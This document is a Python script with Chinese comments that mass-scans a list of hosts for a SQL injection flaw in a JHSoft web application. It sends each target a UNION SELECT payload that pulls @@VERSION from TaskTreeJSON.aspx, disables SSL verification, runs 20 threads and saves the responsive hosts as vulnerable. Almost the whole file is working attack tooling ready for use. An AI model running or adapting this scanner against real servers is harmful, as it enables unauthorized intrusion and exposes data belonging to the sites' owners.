import requests
import re
import concurrent.futures
from urllib.parse import urlparse, urlunparse
import time

# 预编译正则表达式以提高性能
HTTP_PATTERN = re.compile(r'^https?://', re.IGNORECASE)
SQL_ERROR_PATTERNS = [
    re.compile(pattern, re.IGNORECASE) for pattern in [
        r'sql.*error',
        r'syntax.*error',
        r'warning.*mysql',
        r'Microsoft SQL Server',
        r'Oracle.*error',
        r'PostgreSQL.*ERROR',
        r'ODBC.*error',
        r'Driver.*error'
    ]
]
VERSION_PATTERNS = [
    re.compile(pattern, re.IGNORECASE) for pattern in [
        r'Microsoft SQL Server \d{4}',
        r'SQL Server \d{4}',
        r'@@VERSION',
        r'Version:\s*\d+\.\d+\.\d+',
        r'Oracle Database.*Release',
        r'MySQL.*Community Server',
        r'Windows',
        r'windows'
        r'Linux',
        r'linux',
        r'ubuntu',
        r'Ubuntu'
    ]
]
INJECTION_PATTERNS = [
    re.compile(pattern, re.IGNORECASE) for pattern in [
        r'union.*select',
        r'select.*from',
        r'insert.*into',
        r'update.*set',
        r'delete.*from'
    ]
]
DB_COPYRIGHT_INDICATORS = ['Microsoft Corporation', 'Oracle', 'MySQL', 'PostgreSQL']

def normalize_url(url):
    """标准化URL：添加协议头并移除末尾斜杠"""
    # 移除前后空格
    url = url.strip()
    
    # 如果没有协议头，添加http://
    if not HTTP_PATTERN.match(url):
        url = 'http://' + url
    
    # 解析URL
    parsed = urlparse(url)
    
    # 移除路径末尾的斜杠
    path = parsed.path.rstrip('/')
    
    # 重建URL
    normalized = urlunparse((
        parsed.scheme,
        parsed.netloc,
        path,
        parsed.params,
        parsed.query,
        parsed.fragment
    ))
    
    return normalized

def check_vulnerability(response):
    """检查响应中是否存在漏洞迹象"""
    # 如果是404响应，直接返回无漏洞
    if response.status_code == 404:
        return False, "404响应，不进行漏洞分析"

    if response.status_code == 405:
        return False, "405响应，WAF"
    
    content = response.text
    
    # 检查是否存在SQL错误信息
    for pattern in SQL_ERROR_PATTERNS:
        if pattern.search(content):
            return True, f"检测到SQL错误信息: {pattern.pattern}"
    
    # 检查数据库版本信息
    for pattern in VERSION_PATTERNS:
        if pattern.search(content):
            return True, f"检测到数据库版本信息: {pattern.pattern}"
    
    # 检查是否存在JSON响应但包含数据库信息
    if 'application/json' in response.headers.get('Content-Type', '').lower():
        # 检查JSON响应中是否包含数据库相关信息
        json_db_indicators = [
            'id',  # 根据您提供的响应示例
            'permission',
            'value',
            'server'
        ]
        
        for indicator in json_db_indicators:
            if f'"{indicator}"' in content and any(db_term in content for db_term in ['sql', 'database', 'server']):
                return True, f"JSON响应中包含数据库信息: {indicator}"
    
    # 检查响应中是否包含注入成功的特定模式
    for pattern in INJECTION_PATTERNS:
        if pattern.search(content):
            return True, f"检测到SQL注入成功模式: {pattern.pattern}"
    
    return False, "未发现明显漏洞迹象"

def process_url(url, headers):
    """处理单个URL的函数"""
    try:
        # 标准化URL
        normalized_url = normalize_url(url)
        
        # 构造目标URL
        target_path = "/c6/JHSoft.Web.DailyTaskManage/TaskTreeJSON.aspx/?id=1%27+union+all+select+nul1%2C%28select+@@VERSION%29%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull"
        target_url = normalized_url + target_path
        
        # 设置Host头
        parsed_url = urlparse(normalized_url)
        headers_copy = headers.copy()
        headers_copy['Host'] = parsed_url.netloc
        
        # 发送GET请求
        response = requests.get(
            target_url, 
            headers=headers_copy, 
            timeout=10,
            verify=False  # 忽略SSL证书验证
        )
        
        # 检查漏洞
        is_vulnerable, message = check_vulnerability(response)
        
        # 只返回有漏洞的结果
        if is_vulnerable:
            return {
                'url': target_url,
                'status': response.status_code,
                'vulnerable': is_vulnerable,
                'message': message,
                'response_preview': response.text[:400] + "..." if len(response.text) > 400 else response.text
            }
        else:
            # 无漏洞，只返回基本信息用于控制台输出
            return {
                'url': normalized_url,
                'status': response.status_code,
                'vulnerable': is_vulnerable,
                'message': message
            }
            
    except requests.exceptions.RequestException as e:
        error_msg = f"请求失败: {str(e)}"
        # 请求异常，只返回基本信息用于控制台输出
        return {
            'url': url.strip(),
            'status': '请求失败',
            'vulnerable': False,
            'message': error_msg
        }
    except Exception as e:
        error_msg = f"处理URL时发生未知错误: {str(e)}"
        # 其他异常，只返回基本信息用于控制台输出
        return {
            'url': url.strip(),
            'status': '处理失败',
            'vulnerable': False,
            'message': error_msg
        }

def main():
    # 读取URL文件
    try:
        with open('url.txt', 'r', encoding='utf-8') as f:
            urls = [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        print("错误: 未找到url.txt文件")
        return
    except Exception as e:
        print(f"读取文件时发生错误: {e}")
        return
    
    if not urls:
        print("url.txt文件中没有有效的URL")
        return
    
    print(f"开始检测 {len(urls)} 个URL...")
    start_time = time.time()
    
    # 准备请求头
    headers = {
        'User-Agent': 'Mozilla/4.0(compatible;MSIE8.0;WindowsNT6.1)',
        'Accept-Encoding': 'gzip,deflate',
        'Accept': '*/*',
        'Connection': 'close'
    }
    
    # 准备存储有漏洞的结果
    vulnerable_results = []
    
    # 使用线程池并发处理URL
    max_workers = min(20, len(urls))  # 限制最大线程数
    completed = 0
    
    with concurrent.futures.ThreadPoolExecutor(max_workers=max_workers) as executor:
        # 提交所有任务
        future_to_url = {
            executor.submit(process_url, url, headers): url 
            for url in urls
        }
        
        # 处理完成的任务
        for future in concurrent.futures.as_completed(future_to_url):
            completed += 1
            if completed % 10 == 0 or completed == len(urls):
                print(f"已完成 {completed}/{len(urls)} 个URL的检测")
                
            result = future.result()
            
            # 控制台输出所有结果
            print(f"URL: {result['url']}, 状态码: {result['status']}, 漏洞存在: {result['vulnerable']}")
            
            # 只保存有漏洞的结果
            if result['vulnerable']:
                vulnerable_results.append(result)
    
    # 计算总耗时
    elapsed_time = time.time() - start_time
    print(f"检测完成! 总耗时: {elapsed_time:.2f}秒")
    
    # 只将有漏洞的结果写入文件
    try:
        with open('all_result.txt', 'w', encoding='utf-8') as f:
            if vulnerable_results:
                f.write("发现漏洞的URL列表\n")
                f.write("=" * 80 + "\n\n")
                
                for result in vulnerable_results:
                    f.write(f"URL: {result['url']}\n")
                    f.write(f"状态码: {result['status']}\n")
                    f.write(f"漏洞信息: {result['message']}\n")
                    f.write(f"响应预览: {result['response_preview']}\n")
                    f.write("-" * 80 + "\n")
            else:
                f.write("未发现任何漏洞\n")
                
        print(f"共发现 {len(vulnerable_results)} 个漏洞，结果已保存到all_result.txt")
    except Exception as e:
        print(f"写入结果文件时发生错误: {e}")

if __name__ == "__main__":
    # 忽略SSL警告
    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
    
    main()